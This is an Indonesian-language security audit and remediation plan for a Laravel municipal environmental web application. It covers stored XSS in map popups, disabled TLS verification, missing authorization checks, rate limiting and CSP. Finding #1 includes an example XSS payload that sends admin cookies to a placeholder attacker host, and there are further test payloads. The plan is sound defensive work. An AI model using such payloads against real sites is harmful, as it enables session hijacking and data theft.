# Rencana Perbaikan Keamanan — SILINGKAR DLH Kota Palu

Hasil audit ulang dari nol terhadap seluruh source code (routes, semua
controller admin & publik, middleware, model, file upload service, JS peta,
config, dependency) pada 18 Agustus 2026. Tidak mengacu ke laporan/plan
sebelumnya — semua temuan di bawah diverifikasi langsung ke kode saat ini.

Legend: 🔴 Kritis · 🟠 Tinggi · 🟡 Sedang · 🟢 Rendah/Informasional

Cara pakai: centang `[x]` setiap sub-langkah setelah dikerjakan **dan** diuji.

---

## 🔴 KRITIS — kerjakan lebih dulu

### [ ] 1. Stored XSS di popup peta admin via `deskripsi`/`alamat` pengaduan warga
**Dampak:** Warga (tanpa login) mengisi form pengaduan publik (`/pengaduan-sampah`,
`/pengaduan-rth`, `/pengaduan-pengendalian`, `/pengaduan-tata-penataan`) — field
`deskripsi`/`alamat` hanya divalidasi `string|max:...`, tidak ada pembatasan tag
HTML. Data ini lalu masuk ke widget peta "Sebaran Pengaduan" di **Dashboard
admin** (dilihat setiap admin/superadmin yang login) tanpa di-escape:
- `resources/views/admin/partials/sebaran-pengaduan.blade.php` — `r.deskripsi`
  & `r.alamat` dimasukkan ke `details[].value`.
- `resources/js/dlh-markers.js` fungsi `popup()` — men-concat `d.value` langsung
  ke string HTML (`'<span class="dlh-popup-row-text">' + d.value + '</span>'`)
  lalu di-set via `popup.innerHTML = ...` (trigger: klik marker).

Payload seperti `<img src=x onerror="fetch('https://attacker.tld/x?c='+document.cookie)">`
pada `deskripsi` akan tereksekusi di **browser admin/superadmin** saat mereka
klik marker laporan tsb di Dashboard — bisa dipakai untuk mengambil alih sesi
admin (kirim request ber-cookie ke endpoint admin lain, mis. buat user
superadmin baru) karena berjalan dalam konteks sesi admin yang sedang aktif.

**Langkah perbaikan:**
- [ ] Buat helper escape HTML (mis. `escapeHtml(str)` di `dlh-markers.js`,
      setara `htmlspecialchars`) dan pakai di **setiap** titik yang meng-concat
      nilai dinamis ke string HTML popup, minimal:
      - `dlh-markers.js` fungsi `popup()`: `cfg.nama`, `cfg.kategori`,
        `cfg.status.text`, tiap `details[].value`.
      - `map-bundle.js` (armada GPS): variabel `v.title` sebelum di-concat ke `ph`.
      - `map-bundle.js` fungsi `makePopupHtml`/props-loop GIS layer (lihat item
        #2 di bawah — 1 perbaikan bisa sekaligus menutup kedua celah karena
        fungsinya sama, `DlhMarkers.popup()`).
- [ ] Alternatif/tambahan yang lebih aman by-default: ganti pendekatan concat
      string jadi membangun node DOM (`textContent`, bukan `innerHTML`) untuk
      bagian yang berisi data dinamis, dan hanya pakai `innerHTML` untuk markup
      statis (ikon SVG, struktur wrapper).
- [ ] Setelah fix, uji: submit pengaduan (sampah/RTH/pengendalian/tata
      penataan) dengan `deskripsi` = `<img src=x onerror=alert(document.domain)>`,
      lalu buka Dashboard admin sebagai admin bidang terkait, klik marker
      laporan tsb — pastikan payload tampil sebagai **teks**, bukan tereksekusi.
- [ ] Uji regresi: pastikan popup peta (armada, GIS layer, sebaran pengaduan,
      objek pengawasan) masih tampil dengan benar (karakter `<`, `>`, `&` pada
      data normal tidak merusak layout).

---

### [ ] 2. Stored XSS di popup peta publik — data GPS vendor & GIS import tidak di-escape
**Dampak:** Popup marker armada (halaman publik `/armada`, `/peta-persampahan`)
dan popup layer GIS (`/peta-persampahan`, `/peta-objek-pengawasan`, peta admin)
dibangun dari concat string mentah, dieksekusi untuk **setiap pengunjung publik
tanpa perlu login maupun klik** (memakai `maplibregl.Popup().setHTML()` native
yang langsung menyisipkan HTML ke DOM saat marker digambar, bukan hanya saat
di-klik):
- `resources/js/map-bundle.js` fungsi `dlhPetaPersampahanDrawArmada()` — variabel
  `v.title` (nama kendaraan, berasal dari data mentah API vendor GPS
  `portal.gps.id` via `GpsService::updateCache()`, lihat `app/Services/GpsService.php`)
  di-concat langsung ke variabel `ph` lalu `.setHTML(ph)`.
- `resources/js/map-bundle.js` — loop `Object.keys(props).forEach(...)` yang
  membangun detail popup dari **seluruh properti mentah file GeoJSON/SHP** yang
  diimpor admin lewat menu Peta (GIS), tanpa whitelist maupun escaping.
- `resources/views/components/public/peta-objek-pengawasan.blade.php` →
  `nama_perusahaan`, `alamat` (diisi admin bidang Tata Penataan lewat menu
  admin, bukan `{!! !!}` blade — tapi tetap dikirim mentah ke
  `DlhMarkers.popup()` di JS via `@js(...)`).

**Kenapa ini serius meski "hanya admin yang input":** vendor GPS (`portal.gps.id`)
adalah pihak ketiga di luar kendali penuh tim — siapa pun yang berhak
mengganti nama unit di portal vendor tsb (bisa banyak pihak: operator lapangan,
kontraktor, atau — dikombinasikan dengan temuan #3 di bawah — penyerang MITM)
otomatis bisa menyuntik XSS ke **seluruh pengunjung publik** tanpa melalui
akun admin sama sekali. Untuk data GIS import & objek pengawasan, XSS tetap
tersimpan permanen dan menyerang pengunjung publik meski sumber datanya admin.

**Langkah perbaikan:**
- [ ] Sama seperti item #1 — terapkan escaping di `DlhMarkers.popup()` (satu
      perbaikan otomatis menutup celah di sini juga karena fungsi ini dipakai
      bersama).
- [ ] Escape khusus di `map-bundle.js` untuk `v.title` sebelum masuk ke
      template `ph` (armada).
- [ ] Escape setiap `props[key]` sebelum push ke `details` di loop
      `Object.keys(props).forEach(...)` (GIS import) — pertimbangkan juga
      membatasi panjang tiap value (mis. 200 karakter) agar popup tidak bisa
      dipakai untuk DoS visual/payload besar.
- [ ] Uji: set nama unit GPS vendor (atau `raw_data`/`title` di
      `gps_vehicle_cache` langsung via tinker untuk simulasi) berisi payload
      HTML, buka `/armada` sebagai pengunjung anonim — pastikan tidak
      tereksekusi.
- [ ] Uji: import file `.geojson` dengan salah satu properti berisi
      `<script>` atau `<img onerror=...>`, buka `/peta-persampahan` publik —
      pastikan tampil sebagai teks.

---

### [ ] 3. Verifikasi sertifikat TLS dimatikan saat menghubungi API vendor GPS
**Lokasi:** `app/Services/GpsService.php` — method `getToken()` (baris ±44) dan
`fetchWithToken()` (baris ±99), keduanya memakai `Http::withoutVerifying()`
saat mengirim **username & password** login vendor GPS dan saat mengambil data
monitoring dengan bearer token.

**Dampak:** Koneksi ke `portal.gps.id` tidak memverifikasi sertifikat TLS
server tujuan — membuka celah *man-in-the-middle*: siapa pun yang berada di
jalur jaringan (DNS spoofing, rogue proxy, jaringan tidak tepercaya di sisi
hosting) bisa menyadap **kredensial vendor GPS** yang dikirim di setiap
pemanggilan `getToken()`, atau memalsukan data armada yang diterima (termasuk
menyuntik payload XSS — lihat temuan #2 — tanpa perlu mengakses akun vendor
sungguhan).

**Langkah perbaikan:**
- [ ] Hapus `->withoutVerifying()` pada kedua pemanggilan di
      `app/Services/GpsService.php`.
- [ ] Jika alasan awal pemasangan `withoutVerifying()` adalah error sertifikat
      (mis. sertifikat self-signed/expired di sisi vendor, atau masalah CA
      bundle di server produksi), perbaiki akar masalahnya: pastikan CA bundle
      sistem (`cacert.pem`) ter-update di image Docker, **atau** hubungi vendor
      GPS untuk memperbaiki sertifikat mereka — jangan mematikan verifikasi
      sebagai solusi permanen.
- [ ] Uji: jalankan job/scheduler yang memanggil `GpsService::fetchAndCache()`
      di lingkungan staging/produksi setelah perubahan, pastikan login &
      fetch data armada tetap berhasil (cek `storage/logs/laravel.log` untuk
      error `cURL error 60` — jika muncul, baru itu saatnya memperbaiki CA
      bundle, bukan mengembalikan `withoutVerifying()`).

---

## 🟠 TINGGI

### [ ] 4. `ResourceController::downloadFile()` tidak memeriksa kepemilikan/izin per-bidang
**Lokasi:** `app/Http/Controllers/Admin/ResourceController.php` method
`downloadFile()` (±baris 273), route `GET /admin/file/download`.

**Dampak:** Endpoint ini hanya mensyaratkan middleware `auth` + `admin.access`
(yaitu: **login sebagai admin apa pun**, bidang apa pun). Tidak ada
pemeriksaan apakah admin yang meminta punya akses ke *resource*/bidang pemilik
file tsb — berbeda dengan `index/show/store/...` yang selalu memanggil
`$this->authorize($meta)`. Admin bidang RTH yang tahu/menebak path storage
(mis. dari pola penamaan folder `admin/{slug}/...` yang bisa ditebak dari
kode ini sendiri) berpotensi mengunduh lampiran pengaduan/dokumen milik bidang
lain (Pengendalian, Sampah & LB3, dst.) yang mungkin berisi data pribadi
pelapor.

**Langkah perbaikan (pilih salah satu, disarankan opsi A):**
- [ ] **Opsi A:** tambahkan parameter `resource` (slug) wajib di query string,
      panggil `AdminRegistry::find($resource)` lalu `$this->authorize($meta)`
      sebelum melayani file — pastikan path yang diminta memang berada di
      bawah direktori resource tsb (`admin/{slug}/...`) sebagai lapis tambahan.
- [ ] **Opsi B (lebih sederhana, lebih longgar):** jika memang By Design semua
      admin panel (apa pun bidangnya) boleh saling lihat lampiran lintas
      bidang, dokumentasikan keputusan ini secara eksplisit di kode + beri
      tahu pemilik sistem/DPO — karena ini menyangkut kebijakan privasi data
      pelapor, bukan murni keputusan teknis.
- [ ] Uji: login sebagai admin bidang RTH, coba akses
      `/admin/file/download?path=admin/pengaduan-pengendalian/<file-bidang-lain>.jpg` —
      pastikan ditolak (403) bila Opsi A diterapkan.

---

### [ ] 5. Rate limiting tidak konsisten di form publik (Livewire) — 3 dari 7 form tanpa limit
**Lokasi:** `config/livewire.php` (`'middleware' => null` — endpoint update
Livewire utama tidak dibatasi rate secara global, hanya endpoint upload file
yang punya default `throttle:60,1`). Proteksi manual per-komponen memang sudah
ada di beberapa form via `RateLimiter::tooManyAttempts()`, TAPI tidak lengkap:

| Komponen | Rate limit manual? |
|---|---|
| `pengaduan-sampah.blade.php` | ✅ ada (5/jam per IP) |
| `pengaduan-pengendalian.blade.php` | ✅ ada (5/jam per IP) |
| `pengaduan-tata-penataan.blade.php` | ✅ ada (5/jam per IP) |
| `permohonan-rekomendasi.blade.php` | ✅ ada (3/jam per IP) |
| `pengajuan-rintek-pertek.blade.php` | ✅ ada |
| **`pengaduan-rth.blade.php`** | ❌ **tidak ada** |
| **`registrasi-usaha-lb3.blade.php`** | ❌ **tidak ada** |
| **`pinjam-taman.blade.php`** | ❌ **tidak ada** |

**Dampak:** 3 form ini bisa disubmit berulang tanpa batas (spam data,
membanjiri notifikasi admin, membebani storage lewat upload foto/dokumen
berulang, serta memperbesar permukaan untuk temuan #1 di atas — makin banyak
percobaan, makin besar peluang payload XSS "menempel").

**Langkah perbaikan:**
- [ ] Terapkan pola `RateLimiter::tooManyAttempts()` /
      `RateLimiter::hit()` yang sama persis seperti di
      `pengaduan-sampah.blade.php` ke:
      - `resources/views/components/public/pengaduan-rth.blade.php`
      - `resources/views/components/public/registrasi-usaha-lb3.blade.php`
      - `resources/views/components/public/pinjam-taman.blade.php`
- [ ] Pertimbangkan solusi lebih menyeluruh: pasang
      `throttle:60,1` (atau nilai lain sesuai kebutuhan) di
      `config/livewire.php` pada level middleware endpoint update Livewire
      global, sebagai jaring pengaman tambahan di luar limit manual per-form.
- [ ] Uji: submit form RTH/registrasi LB3/pinjam-taman berulang kali (>5x)
      dalam waktu singkat dari IP yang sama — pastikan muncul pesan "terlalu
      banyak percobaan" setelah melewati batas.

---

### [ ] 6. CSP masih mengizinkan `'unsafe-inline'` dan `'unsafe-eval'` pada policy yang di-enforce
**Lokasi:** `app/Http/Middleware/SecurityHeaders.php` — header
`Content-Security-Policy` (yang aktif memblokir) masih berisi
`script-src 'self' 'unsafe-inline' 'unsafe-eval'`. Sudah ada mekanisme
migrasi paralel yang baik (nonce + `Content-Security-Policy-Report-Only`
tanpa `unsafe-inline`), tapi migrasinya belum selesai — kebijakan yang benar-benar
memblokir (bukan report-only) masih permisif.

**Dampak:** Selama `unsafe-inline`/`unsafe-eval` masih aktif di policy yang
di-*enforce*, CSP praktis tidak memberi proteksi tambahan terhadap XSS
(termasuk dua XSS di atas) — payload `<script>`/`onerror=`/`onload=` inline
tetap diizinkan berjalan oleh browser walau CSP terpasang.

**Langkah perbaikan:**
- [ ] Pantau pelanggaran yang muncul di `Content-Security-Policy-Report-Only`
      (buka console browser di semua halaman utama: publik & admin) untuk
      inventarisasi semua inline script/handler yang masih perlu dimigrasi ke
      nonce atau file eksternal.
- [ ] Migrasi bertahap per halaman: pindahkan `<script>...</script>` inline ke
      `@push('scripts')` dengan atribut nonce (`{{ $cspNonce }}` — mekanisme
      sudah ada via `Vite::cspNonce()`), atau ke file `.js` terpisah.
- [ ] Cari & hilangkan pemakaian `eval()`/`new Function()` (biasanya dari
      bundling/minifier tertentu) yang memicu kebutuhan `unsafe-eval`.
- [ ] Setelah Report-Only bersih dari pelanggaran (0 laporan selama beberapa
      hari pemakaian normal), promosikan policy nonce-based tsb menjadi
      policy yang di-*enforce*, hapus `unsafe-inline`/`unsafe-eval` dari
      header `Content-Security-Policy` utama.
- [ ] **Catatan:** ini pekerjaan lintas-file yang besar — jadwalkan sebagai
      item terpisah, bukan quick-fix, tapi tetap prioritas tinggi karena CSP
      adalah lapis pertahanan kedua untuk XSS di atas.

---

## 🟡 SEDANG

### [ ] 7. Audit dependency belum otomatis (Composer & npm)
**Konteks:** Versi package saat ini (`laravel/framework v12.63.0`,
`livewire/livewire v4.3.3`, `barryvdh/laravel-dompdf v3.1.2` /
`dompdf/dompdf v3.1.5`, `ezyang/htmlpurifier v4.19.0`, `guzzlehttp/guzzle
7.13.2`) tergolong versi yang cukup baru per Januari 2026; tidak ditemukan
indikasi versi usang secara jelas dari pemeriksaan manual. Namun tidak ada
proses otomatis yang memverifikasi ini secara berkala, dan pemeriksaan manual
tidak menggantikan database advisory resmi (Composer/GitHub tidak bisa
diakses dari lingkungan audit ini untuk cross-check CVE terbaru).

**Langkah perbaikan:**
- [ ] Jalankan `composer audit` dan `npm audit` secara manual sekarang
      (di lingkungan dengan akses internet penuh) sebagai baseline, catat &
      tindak lanjuti temuan bila ada.
- [ ] Aktifkan Dependabot (GitHub) atau Renovate untuk composer.json &
      package.json agar update keamanan terdeteksi otomatis.
- [ ] Tambahkan `composer audit` ke pipeline CI/CD (jika ada) agar build gagal
      jika ditemukan vulnerability tingkat high/critical yang belum di-patch.

### [ ] 8. `app/Support/DataIO.php` — pastikan sanitasi formula CSV/XLSX tetap konsisten ke depan
**Konteks:** Saat audit ini, `sanitizeCell()` sudah diterapkan di titik-titik
penulisan CSV/XLSX (`csvDownload`, `writeCsvFile`, `xlsxCell`,
`csvRowsDownload`) — **tidak ada tindakan perbaikan diperlukan sekarang**.
Dicatat di sini sebagai item proses, bukan bug:

- [ ] Tambahkan test otomatis (unit test) yang menegaskan
      `DataIO::sanitizeCell()` selalu dipanggil untuk setiap fungsi export
      baru yang mungkin ditambahkan di masa depan (mis. assert bahwa string
      berawalan `=`, `+`, `-`, `@` selalu diberi prefix apostrophe pada
      hasil akhir), agar regresi (fungsi export baru lupa memanggilnya)
      langsung ketahuan di CI.

### [ ] 9. `robots.txt` & `security.txt` — sudah baik, jadikan baseline
**Konteks:** `public/robots.txt` sudah men-disallow `/admin` dan `/api/`;
`.well-known/security.txt` sudah ada dengan kontak yang benar. Tidak ada
tindakan wajib. Opsional:
- [ ] Tambahkan juga `Disallow: /admin` versi tanpa trailing difference untuk
      subpath (`/admin/*` sudah otomatis ter-cover oleh `/admin`, jadi cukup
      sebagai pengingat — tidak ada perubahan kode diperlukan).

---

## 🟢 RENDAH / INFORMASIONAL

### [ ] 10. `TRUSTED_PROXIES` — default aman, tambahkan pengaman dokumentasi
**Lokasi:** `bootstrap/app.php`, default `172.16.0.0/12,127.0.0.1` (aman).
Risiko hanya muncul jika seseorang mengubah `.env` produksi menjadi
`TRUSTED_PROXIES=*` secara tidak sengaja (mis. saat debugging), yang akan
membuat header `X-Forwarded-For` dari siapa pun dipercaya mentah — berdampak
ke rate limiting (`throttle:*` by IP, termasuk semua limiter yang disebut di
temuan #5) dan pencatatan IP di `ActivityLog`.
- [ ] Tambahkan komentar tegas di `.env.example` (jika belum ada baris yang
      cukup eksplisit) bahwa `TRUSTED_PROXIES=*` tidak boleh dipakai di
      produksi kecuali reverse-proxy benar-benar terisolasi penuh.
- [ ] Opsional: tambahkan pemeriksaan startup yang mencatat warning ke log
      bila `APP_ENV=production` tapi `TRUSTED_PROXIES=*`.

### [ ] 11. Dockerfile/nginx — catatan pengerasan kecil, tidak mendesak
- [ ] `nginx.conf` tidak mengatur `client_max_body_size` secara eksplisit
      (default nginx 1MB) — jika ini yang membatasi upload backup restore
      (maks 500MB di `BackupController`) atau upload dokumen besar, pastikan
      nilai ini disamakan/dilonggarkan secukupnya di konfigurasi nginx
      produksi (di luar file `nginx.conf` contoh ini bila produksi memakai
      konfigurasi lain).
- [ ] Tidak ditemukan proses berjalan sebagai root secara tidak perlu di
      `Dockerfile` (php-fpm master process by design perlu start sebagai root
      lalu drop privilege ke `www-data` di level pool config bawaan image
      resmi) — tidak ada tindakan wajib.

---

## Area yang sudah diperiksa dan terlihat aman (dicatat sebagai bukti cakupan audit, bukan asumsi)

- **Mass assignment / privilege escalation** — `ResourceController::payload()`
  membangun payload field-by-field dari `AdminRegistry::formFields()`, bukan
  `$request->all()`; role/`additional_access` di-guard `abort_unless(...isSuperadmin())`.
- **SQL Injection** — seluruh query pakai Eloquent/query builder; kolom
  sort & search di `ResourceController::query()` divalidasi terhadap
  `$meta['columns']`/`getFillable()`, tidak menerima nama kolom mentah dari
  request.
- **File upload** — SVG/SVGZ ditolak eksplisit (`FileUploadService::isSvg()`);
  gambar raster di-*re-encode* penuh ke WebP (menghapus payload polyglot +
  metadata EXIF/GPS); nama file disanitasi dari path traversal & karakter
  berbahaya; disk `public` sebenarnya S3-compatible (Backblaze B2), bukan
  filesystem lokal di webroot.
- **Backup/restore** — dibatasi `isSuperadmin()`, konfirmasi dua langkah
  (kata "RESTORE" + kode acak sekali-pakai per sesi via `hash_equals`).
- **SSRF guard** — `SettingController::assertSafeOutboundUrl()` memvalidasi
  skema + pola IP privat + resolusi DNS sebelum server menghubungi `base_url`
  custom AI provider yang diisi admin.
- **API key AI provider** — disimpan terenkripsi (`'api_key' => 'encrypted'`
  cast) di `AiProvider` model.
- **Auth & session** — password di-hash (`'password' => 'hashed'` cast,
  bcrypt via `BCRYPT_ROUNDS=12`), sesi diregenerasi saat login & password
  berubah, cookie `HttpOnly` + `SameSite=Lax` + `Secure` (saat produksi),
  akun nonaktif (`is_active=false`) diblokir di level `AdminAccess::hasAnyPanelRole()`,
  tidak ada user enumeration di pesan error login.
- **IDOR sertifikat/bukti PDF publik** — route sertifikat sosialisasi memakai
  token acak (`{token}.pdf`, dicocokkan via `where('token', $token)`, bukan ID
  berurutan); nomor tiket (`TicketGenerator`) 8 karakter alfanumerik acak +
  dibatasi rate limit di endpoint publik terkait.
- **Path traversal** — `OgImageProxyController` & `ResourceController::downloadFile()`
  (untuk validasi path-nya sendiri, terlepas dari temuan #4 soal otorisasi)
  memvalidasi `..`, path absolut, null byte, backslash dengan benar.
- **Sensitive data di log** — `ActivityLogger::HIDDEN` mengecualikan
  `password`, `api_key`, `remember_token`, dll dari diff log aktivitas;
  `ChatStreamController` sengaja tidak mencatat isi pesan warga ke log.
- **Formula injection CSV/XLSX** — sudah disanitasi (lihat item #8).
- **HTML sanitization konten artikel** — `HtmlSanitizer` (HTMLPurifier
  dengan whitelist tag/atribut/skema URL) dipakai konsisten sebelum konten
  artikel disimpan (`ResourceController::payload()`) dan dirender
  (`{!! $kontenBersih !!}` di `berita/show.blade.php` & `admin/artikel/show.blade.php`).

---

## Urutan pengerjaan yang disarankan
1. **🔴 #1, #2, #3** — perbaiki dalam 1 batch (escaping popup peta + hapus
   `withoutVerifying()`), karena saling terkait dan berdampak langsung ke
   pengunjung publik maupun sesi admin.
2. **🟠 #4, #5** — perbaikan cepat, effort kecil–sedang, tutup celah akses
   file lintas-bidang & lengkapi rate limiting yang bolong.
3. **🟠 #6** — jadwalkan sebagai proyek tersendiri (refactor CSP bertahap).
4. **🟡 #7, #8, #9** — proses/dokumentasi, kerjakan paralel kapan saja.
5. **🟢 #10, #11** — opsional, prioritas paling rendah.

Setelah setiap perbaikan, jalankan regresi manual pada fitur terkait (peta
armada publik, peta GIS admin, peta objek pengawasan, dashboard admin per
role, submit semua form pengaduan/permohonan publik, integrasi GPS vendor,
unduh lampiran admin) sebelum deploy ke produksi.
